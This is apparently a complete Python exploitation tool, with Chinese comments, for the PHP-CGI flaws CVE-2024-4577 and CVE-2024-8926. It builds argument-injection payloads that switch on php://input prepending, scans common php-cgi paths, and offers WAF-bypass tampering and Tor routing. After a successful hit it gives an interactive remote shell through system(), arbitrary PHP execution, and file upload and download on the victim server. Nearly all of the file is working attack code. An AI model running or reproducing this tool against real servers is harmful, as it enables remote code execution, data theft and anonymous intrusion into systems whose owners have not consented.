import argparse
import requests
import sys
import urllib3
import chardet
import os
import base64
import re
import time
from urllib.parse import urlparse
import banner
import tor_helper

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Payload 參數庫
PAYLOAD_ELEMENTS = {
    1: "disable_functions%3d%26",
    2: "disable_classes%3d%26",
    3: "open_basedir%3d",
    4: "cgi.force_redirect%3d0",
    5: "cgi.redirect_status_env",
    6: "allow_url_include%3d1",
    7: "allow_url_fopen%3d1",
    8: "auto_prepend_file%3dphp://input",
    9: "file_uploads%3d1",
    10: "upload_max_filesize%3d0",
    11: "log_errors%3d0",
    12: "post_max_size%3d0",
    13: "memory_limit%3d%2B1",
    14: "enable_dl%3d1",
    15: "max_execution_time%3d0",
    16: "short_open_tag%3d1",
    17: "max_input_time%3d0",
    18: "expose_php%3d1"
}

# 預設 Payload 組合庫
PAYLOAD_COMBINATIONS = {
    "1": [1, 2, 3, 4, 5, 6, 7, 8],
    "2": [1, 4, 5, 6, 8],
    "3": [4, 6, 8],
}

# 連接符
CVE_PREFIXES = {
    "CVE-2024-4577": "%ADd",
    "CVE-2024-8926": "%a8-d%a8"
}

# 常見 CGI 路徑字典
CGI_POINTS = [
    "/php-cgi/php-cgi.exe", "/cgi-bin/php-cgi.exe",
    "/php-cgi.exe", "/cgi/php-cgi.exe", "/php.exe",
    "/cgi-bin/php.exe", "/cgi/php.exe",
    "/index.php", "/"
]

# 全域變數初始設定
enable_log = False
VERBOSE_MODE = False
use_tor = False
tor_session = None
timeout_value = 10
active_request_template = None
selected_payload_group = "1"
PAYLOAD_GROUPS = {}

# Parse arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description="CVE-2024-4577 & CVE-2024-8926 Exploitation Tool")
    parser.add_argument("-u", "--url", required=True, help="目標網址")
    parser.add_argument("--timeout", type=int, default=10, help="預設為10，若須逾時秒數，0 為無限等待，建議 1~30，最大 120")
    parser.add_argument("--log", action="store_true", help="啟用shell log 模式")
    parser.add_argument("--verbose", action="store_true", help="顯示詳細請求資訊，更好的進行判斷")
    parser.add_argument("--payload", nargs="?", const="SELECT", help="選擇 Payload 編號，預設為1，若未指定值則進入選單選擇，輸入 C 則進入自訂模式")
    parser.add_argument("--tor", action="store_true", help="啟用 Tor 模式")
    parser.add_argument("--bypass", action="store_true", help="啟用 WAF 繞過測試")
    return parser.parse_args()

# 組合 Payload
def generate_payload_groups():
    global PAYLOAD_GROUPS
    PAYLOAD_GROUPS = {
        group_id: {
            cve: "+".join([f"{prefix}+{PAYLOAD_ELEMENTS[e]}" for e in elements])
            for cve, prefix in CVE_PREFIXES.items()
        }
        for group_id, elements in PAYLOAD_COMBINATIONS.items()
    }
    return PAYLOAD_GROUPS

PAYLOAD_GROUPS = generate_payload_groups()
selected_payload_group = "1"
PAYLOADS = PAYLOAD_GROUPS[selected_payload_group]

# Payload List排版
def format_payload(payload):
    parts = re.split(r'(%AD|%a8)', payload)
    ad_count = 0
    a8_count = 0
    formatted_parts = []
    for part in parts:
        if part == "%AD":
            ad_count += 1
            if ad_count >= 2:
                formatted_parts.append("\n     " + part)
            else:
                formatted_parts.append(part)
        elif part == "%a8":
            a8_count += 1
            if a8_count % 2 == 1 and a8_count >= 3:
                formatted_parts.append("\n     " + part)
            else:
                formatted_parts.append(part)
        else:
            formatted_parts.append(part)
    return ''.join(formatted_parts)

# Payload選擇
def get_selected_payload_group(args):
    global selected_payload_group, PAYLOADS
    if "--payload" not in args:
        selected_payload_group = "1"
        PAYLOADS = PAYLOAD_GROUPS[selected_payload_group]
        return selected_payload_group, PAYLOADS

    payload_index = args.index("--payload") + 1
    if payload_index >= len(args):
        print("[!] 沒有指定 `Payload`，請手動選擇！")
        return show_payload_list()

    user_choice = args[payload_index]
    if user_choice in PAYLOAD_GROUPS:
        selected_payload_group = user_choice
        PAYLOADS = PAYLOAD_GROUPS[selected_payload_group]
        return selected_payload_group, PAYLOADS

    print("[!] 無效的 `Payload`，請手動選擇！")
    return show_payload_list()

# 顯示可用 `Payload`，讓使用者手動選擇
def show_payload_list():
    global selected_payload_group
    print("\n[!] 可用的 Payload 組合：")
    for idx in sorted(PAYLOAD_GROUPS.keys()):
        print(f"{idx}) 使用以下 Payloads:")
        for name, payload in PAYLOAD_GROUPS[idx].items():
            formatted_payload = format_payload(payload)
            print(f"   - {name}: \n     {formatted_payload}")

    while True:
        user_choice = input("[?] 請輸入對應的編號來切換 Payload 組或使用 C 自訂 Payload : ").strip()
        if user_choice in PAYLOAD_GROUPS:
            selected_payload_group = user_choice
            break
        elif user_choice.upper() == "C":
            print("\n[*] 進入自訂 Payload 模式...")
            selected_payload_group = customize_payload()
            break
        else:
            print("[!] 無效輸入，請輸入正確的數字或 `C` 來自訂 Payload！")

    return selected_payload_group, PAYLOAD_GROUPS[selected_payload_group]

# 自訂 Payload
def customize_payload():
    global PAYLOAD_COMBINATIONS, PAYLOAD_GROUPS, PAYLOADS, selected_payload_group
    print("\n==============================================")
    print("[*] 目前可用的 Payload 元素：")
    for key, value in PAYLOAD_ELEMENTS.items():
        print(f"{key}: {value}\n")
        time.sleep(0.05)
    print("==============================================\n")

    while True:
        user_input = input("[?] 請輸入要組合的元素編號（用空格分隔，例如 ： 1 3 5 7）：").strip()
        selected_elements = user_input.split()

        if all(e.isdigit() and int(e) in PAYLOAD_ELEMENTS for e in selected_elements):
            selected_elements = [int(e) for e in selected_elements]
            break
        else:
            print("[!] 無效輸入，請輸入可用的編號，用空格分隔！")

    new_id = str(len(PAYLOAD_COMBINATIONS) + 1)
    PAYLOAD_COMBINATIONS[new_id] = selected_elements
    PAYLOAD_GROUPS[new_id] = {
        cve: "+".join([f"{prefix}+{PAYLOAD_ELEMENTS[e]}" for e in selected_elements])
        for cve, prefix in CVE_PREFIXES.items()
    }

    print("\n[+] 已成功新增自訂 Payload！")
    print(f"[*] CVE-2024-4577 Payload: \n    {PAYLOAD_GROUPS[new_id]['CVE-2024-4577']}")
    print(f"[*] CVE-2024-8926 Payload: \n    {PAYLOAD_GROUPS[new_id]['CVE-2024-8926']}\n")

    selected_payload_group = new_id
    PAYLOADS = PAYLOAD_GROUPS[selected_payload_group]
    return new_id

# 選擇bypass方案
def interactive_bypass_setup():
    try:
        from bypass_manager import load_all_tampers
    except ImportError:
        print("[!] 錯誤：未找到 `bypass_manager` 模組，請確認此模組是否存在。")
        return [], 0
    all_tampers = load_all_tampers()
    print("\n[*] 可用繞過方案：")
    for idx, (name, desc) in enumerate(all_tampers.items(), 1):
        print(f"{idx}) {name} ：")
        print(f"   {desc}\n")
        time.sleep(0.05)

    chosen = input("[?] 請輸入要啟用的方案編號（可多選，例如：1 3 4）: ").strip().split()
    selected = []
    for c in chosen:
        if c.isdigit() and 1 <= int(c) <= len(all_tampers):
            selected.append(list(all_tampers.keys())[int(c) - 1])
    
    if len(selected) > 1:
        print("[!] 提醒：多個繞過方案可能導致相互衝突或失敗！")
        
    retries = input("[?] 請輸入重試次數（建議 1-10）: ").strip()
    retries = int(retries) if retries.isdigit() and int(retries) > 0 else 1

    return selected, retries

# 執行bypass模式
def run_bypass_mode(url, selected_module_names, retry_count):
    try:
        from bypass_manager import load_tamper_functions
    except ImportError:
        print("[!] 錯誤：未找到 `bypass_manager` 模組，無法進行繞過測試！")
        return None, None

    print(f"[*] 繞過測試將進行 {retry_count} 次變形重試。\n")
    tamper_funcs = load_tamper_functions(selected_module_names)
    original_elements = PAYLOAD_COMBINATIONS[selected_payload_group]

    for payload_key in PAYLOADS:
        for _ in range(retry_count):
            for cgipoint in CGI_POINTS:
                original_payload = PAYLOADS[payload_key]

                req = {
                    "url": url,
                    "cgipoint": cgipoint,
                    "payload": original_payload,
                    "headers": {},
                    "post_data": "<?php echo 'TEST_BYPASS'; ?>",
                    "element_ids": original_elements,
                    "cve_id": payload_key
                }

                for tamper in tamper_funcs:
                    req = tamper(req)

                full_url = f"{req['url']}{req['cgipoint']}?{req['payload']}"
                response = send_request(full_url, req["post_data"], timeout=timeout_value, headers=req["headers"])

                if response and "TEST_BYPASS" in response:
                    print(f"[+] 成功繞過！使用: {', '.join(selected_module_names)}")
                    print(f"[+] 找到CGI注入點 : {req['cgipoint']} (漏洞: {payload_key})")
                    global active_request_template
                    active_request_template = req  # 儲存完整請求結構
                    return req["cgipoint"], payload_key

    print("[-] 所有策略組合嘗試失敗")
    return None, None

# 自動轉換編碼
def decode_response(response):
    detected = chardet.detect(response.content)
    encoding = detected.get('encoding')
    return response.content.decode(encoding, errors='replace') if encoding else response.content.decode('utf-8', errors='replace')

# 發送請求
def send_request(url, data, timeout=None, headers=None, use_template=False):
    if headers is None:
        headers = {}
    try:
        global active_request_template
        if use_template and active_request_template:
            url = f"{url}{active_request_template['cgipoint']}?{active_request_template['payload']}"
            headers = active_request_template.get("headers", {})
            
        if VERBOSE_MODE:
            print("\n==============================================")
            print(f"[*] 發送請求至: {url}")
            print(f"[*] 請求數據: {data}")
            print(f"[*] 超時設定: {timeout}")
            if headers:
                print(f"[*] 自訂表頭: {headers}")
            print("==============================================\n")

        if isinstance(data, str):
            data = data.encode("utf-8")

        if use_tor:
            response = tor_session.post(url, data=data, headers=headers, timeout=timeout)
        else:
            response = requests.post(url, data=data, headers=headers, verify=False, timeout=timeout)

        if VERBOSE_MODE:
            print("==============================================\n")
            print(f"[*] 回應狀態碼: {response.status_code}")
            print(f"[*] 原始回應內容: {response.text[:500]}\n")
            print("==============================================\n")

        return decode_response(response)
    except Exception as e:
        print(f"[!] 請求錯誤: {e}")
        return None

# 枚舉注入點
def choose_cgipoint(url, payload_key):
    test_payload = "<?php echo 'TEST_VULNTEST_CVE-2024-4577'; die(); ?>"
    if VERBOSE_MODE:
        print("\n==============================================")
        print(f"[*] 測試 Payload {payload_key}")
        print(f"[*] 當前 Payload: {PAYLOADS[payload_key]}")
        print("==============================================\n")

    for ep in CGI_POINTS:
        target_url = f"{url}{ep}?{PAYLOADS[payload_key]}"
        resp = send_request(target_url, test_payload, timeout=timeout_value)
        if resp and 'TEST_VULNTEST_CVE-2024-4577' in resp:
            print(f"[+] 找到CGI注入點 : {ep} (漏洞: {payload_key})")
            return ep
    print(f"[-] 未找到漏洞 (CVE: {payload_key})")
    return None
    
# 移除不能用於檔名的字元
def sanitize_filename(filename):
    return re.sub(r'[\/:*?"<>|]', '_', filename)

# 以攻擊目標的 host 為基礎建立檔案名稱
def get_unique_filepath(directory, host):
    base_filename = sanitize_filename(host)
    candidate = os.path.join(directory, f"{base_filename}.txt")
    i = 1
    while os.path.exists(candidate):
        candidate = os.path.join(directory, f"{base_filename}_{i}.txt")
        i += 1
    return candidate

# 取得目標網站的根目錄
def get_remote_docroot(url, cgipoint, payload_key):
    payload = "<?php echo $_SERVER['DOCUMENT_ROOT']; die(); ?>"
    target_url = f"{url}{cgipoint}?{PAYLOADS[payload_key]}"
    resp = send_request(target_url, payload, timeout=timeout_value)
    return resp.strip() if resp else None

# 交互式shell
def exploit_shell(url, cgipoint, payload_key):
    print("[*] 輸入命令，輸入 exit 結束，可使用 --save 儲存單次輸出：")
    host = urlparse(url).netloc
    log_dir = os.path.join(os.getcwd(), "log")
    if enable_log:
        print("[*] log模式已啟動")
        if not os.path.exists(log_dir):
            os.makedirs(log_dir)
    log_path = os.path.join(log_dir, f"{host}.log") if enable_log else None

    while True:
        cmd = input("shell> ").strip()
        if cmd.lower() == "exit":
            break

        parts = cmd.split("--save")
        real_cmd = parts[0].strip()
        save_path = parts[1].strip() if len(parts) > 1 else None

        if save_path == "":
            save_dir = os.path.join(os.getcwd(), "output")
            if not os.path.exists(save_dir):
                os.makedirs(save_dir)
            save_path = get_unique_filepath(save_dir, host)

        payload = f"<?php system('{real_cmd}'); die(); ?>"
        if active_request_template:
            resp = send_request(url, payload, timeout=timeout_value, use_template=True)
        else:
            target_url = f"{url}{cgipoint}?{PAYLOADS[payload_key]}"
            resp = send_request(target_url, payload, timeout=timeout_value)

        output = resp.strip() if resp else ""
        print(output)

        if save_path:
            save_path = os.path.abspath(save_path)
            with open(save_path, "w", encoding="utf-8") as f:
                f.write(output)
            print(f"[+] 輸出結果已儲存至 {save_path}")

        if enable_log:
            with open(log_path, "a", encoding="utf-8") as f:
                f.write(f"CMD: {real_cmd}\n{output}\n{'-'*20}\n")

# 自訂php
def custom_php_mode(url, cgipoint, payload_key):
    print("[*] 輸入PHP程式碼，輸入 EOF 結束，可使用 --save 儲存輸出：")
    php_code = ""
    save_path = None
    host = urlparse(url).netloc

    while True:
        line = input()
        if line.strip().startswith("EOF"):
            parts = line.split("--save")
            if len(parts) > 1:
                save_path = parts[1].strip()
                if save_path == "":
                    save_dir = os.path.join(os.getcwd(), "output")
                    if not os.path.exists(save_dir):
                        os.makedirs(save_dir)
                    save_path = get_unique_filepath(save_dir, host)
            break
        php_code += line + "\n"

    payload = f"<?php {php_code}\ndie(); ?>"
    if active_request_template:
        resp = send_request(url, payload, timeout=timeout_value, use_template=True)
    else:
        target_url = f"{url}{cgipoint}?{PAYLOADS[payload_key]}"
        resp = send_request(target_url, payload, timeout=timeout_value)
    output = resp.strip() if resp else ""
    print(output)

    if save_path:
        save_path = os.path.abspath(save_path)
        with open(save_path, "w", encoding="utf-8") as f:
            f.write(output)
        print(f"[+] PHP輸出結果已儲存至 {save_path}")

# 上傳檔案
def upload_file(url, cgipoint, payload_key):
    local = input("本地檔案路徑：").strip()
    remote = input("目標完整路徑（若留空將上傳至網站根目錄）：").strip()
    if remote == "":
        docroot = get_remote_docroot(url, cgipoint, payload_key)
        if docroot:
            remote = os.path.join(docroot, os.path.basename(local)).replace("\\", "/")
            print(f"[*] 已自動設定上傳路徑為: {remote}")
        else:
            print("[!] 無法取得網站根目錄，請手動指定完整路徑")
            return

    try:
        with open(local, "r", encoding="utf-8", errors="ignore") as f:
            raw_content = f.read()
    except Exception as e:
        print(f"[!] 讀取本地檔案失敗: {e}")
        return

    payload = f"<?php file_put_contents('{remote}', '{raw_content}'); echo 'OK'; die(); ?>"
    if active_request_template:
        resp = send_request(url, payload, timeout=timeout_value, use_template=True)
    else:
        resp = send_request(f"{url}{cgipoint}?{PAYLOADS[payload_key]}", payload)

    if resp and "OK" in resp:
        print(f"[+] 成功上傳至 {remote}")
    else:
        print("[!] 上傳失敗，無回應")

# 下載檔案
def download_file(url, cgipoint, payload_key):
    remote = input("遠端檔案路徑：").strip()
    local = os.path.join("download", os.path.basename(remote))
    if not os.path.exists("download"):
        os.makedirs("download")

    payload = f"<?php echo file_get_contents('{remote}'); die(); ?>"
    if active_request_template:
        resp = send_request(url, payload, timeout=timeout_value, use_template=True)
    else:
        resp = send_request(f"{url}{cgipoint}?{PAYLOADS[payload_key]}", payload)

    if resp:
        with open(local, "wb") as f:
            f.write(resp.encode("utf-8"))
        print(f"已下載至 {local}")

# 失敗後動作清單
def show_fail_menu(target, selected_payload_group, bypass_modules_selected, bypass_retry_count):
    print("\n[-] 未找到可用漏洞，請選擇下一步：")
    time.sleep(0.05)
    print(f"1) 重新輸入目標 (當前目標：{target})")
    payload_display = "自訂" if selected_payload_group not in PAYLOAD_COMBINATIONS else selected_payload_group
    time.sleep(0.05)
    print(f"2) 切換 Payload (當前 Payload: {payload_display})")
    bypass_info = f"{', '.join(bypass_modules_selected)}；次數: {bypass_retry_count}" if bypass_modules_selected else "（未選擇）"
    time.sleep(0.05)
    print(f"3) 設定 Bypass 模式 (已選方案: {bypass_info})")
    time.sleep(0.05)
    print("4) 重新測試 (套用當前設定)")
    time.sleep(0.05)
    print("5) 離開程式")
    return input("\n>> ").strip()

# main 函數
def main():
    global timeout_value, PAYLOADS, selected_payload_group, VERBOSE_MODE, enable_log, use_tor, tor_session

    args = parse_arguments()
    target = args.url
            
    enable_log = args.log
    VERBOSE_MODE = args.verbose
    use_tor = args.tor
    enable_bypass = args.bypass
    
    banner.play_banner(use_tor, enable_bypass)
    banner.Show_Disclaimer()
    
    if args.timeout == 0:
        timeout_value = None
        print("[*] 已設置為無限等待")
    elif args.timeout > 120:
        print("[!] 等待時間過久 (超過 120 秒)，如需要無限等待請使用 --timeout=0")
        sys.exit(1)
    elif args.timeout > 30:
        timeout_value = args.timeout
        print("[!] 警告：timeout 超過 30 秒，測試可能會耗時較久")
    elif args.timeout < 1:
        print("[!] 錯誤：timeout 必須為 0 或 1~120 之間的整數")
        sys.exit(1)
    else:
        timeout_value = args.timeout
        if args.timeout != 10:
            print(f"[*] 設定請求超時時間為 {timeout_value} 秒")

    if use_tor:
        tor_session = tor_helper.get_tor_session()
        if not tor_session:
            sys.exit(1)

    # Payload選擇邏輯區塊
    generate_payload_groups()

    if args.payload == "C":
        print("\n[*] 進入自訂 Payload 模式...")
        selected_payload_group = customize_payload()
    elif args.payload and args.payload in PAYLOAD_GROUPS:
        selected_payload_group = args.payload
    elif args.payload:  # 有提供但不合法（例如 --payload 沒指定值、或是錯字）
        print("[!] 無效或遺漏的 Payload 組合，進入選擇介面")
        selected_payload_group, PAYLOADS = show_payload_list()
    else:
        selected_payload_group = "1"  # 預設組合

    # 確保 PAYLOADS 一定對應正確
    PAYLOADS = PAYLOAD_GROUPS.get(selected_payload_group, PAYLOAD_GROUPS["1"])

    bypass_modules_selected = []
    bypass_retry_count = 1
    if enable_bypass:
        bypass_modules_selected, bypass_retry_count = interactive_bypass_setup()

    while True:
        selected_cgipoint, selected_payload = None, None
        next_action = None 
        already_scanned_this_round = False
        print("[*] 開始測試...")

        if enable_bypass and bypass_modules_selected:
            print("[*] 已啟用 Bypass 模式，套用以下繞過策略：")
            for name in bypass_modules_selected:
                print(f"    - {name}")
            print(f"[*] 將重試每組繞過組合 {bypass_retry_count} 次\n")

            selected_cgipoint, selected_payload = run_bypass_mode(target, bypass_modules_selected, bypass_retry_count)
            already_scanned_this_round = True

        if not already_scanned_this_round:
            for p in PAYLOADS:
                ep = choose_cgipoint(target, p)
                if ep:
                    selected_cgipoint, selected_payload = ep, p
                    break

        while not selected_cgipoint:
            next_action = show_fail_menu(target, selected_payload_group, bypass_modules_selected, bypass_retry_count)
            if next_action == "1":
                target = input("輸入新目標 URL: ").strip()
            elif next_action == "2":
                selected_payload_group, PAYLOADS = show_payload_list()
            elif next_action == "3":
                enable_bypass = True
                bypass_modules_selected, bypass_retry_count = interactive_bypass_setup()
            elif next_action == "4":
                break
            else:
                print("[*] 程式結束")
                sys.exit(0)

        if next_action != "4" and not selected_cgipoint:
            continue

        while selected_cgipoint:
            print(f"\n[*] 當前目標: {target} (漏洞: {selected_payload})")
            time.sleep(0.05)
            print("模式選擇:")
            time.sleep(0.05)
            print("1) Shell模式 (system())")
            time.sleep(0.05)
            print("2) PHP自訂端模式 (eval())")
            time.sleep(0.05)
            print("3) 上傳檔案")
            time.sleep(0.05)
            print("4) 下載檔案")
            time.sleep(0.05)
            print("5) 切換攻擊目標")
            time.sleep(0.05)
            print("6) 離開程式")

            choice = input(">> ").strip()
            if choice == "1":
                exploit_shell(target, selected_cgipoint, selected_payload)
            elif choice == "2":
                custom_php_mode(target, selected_cgipoint, selected_payload)
            elif choice == "3":
                upload_file(target, selected_cgipoint, selected_payload)
            elif choice == "4":
                download_file(target, selected_cgipoint, selected_payload)
            elif choice == "5":
                target = input("輸入新目標URL: ").strip()
                break
            elif choice == "6":
                print("[*] 程式結束")
                sys.exit(0)
            else:
                print("[!] 無效的選擇，請重新選擇")

if __name__ == "__main__":
    main()




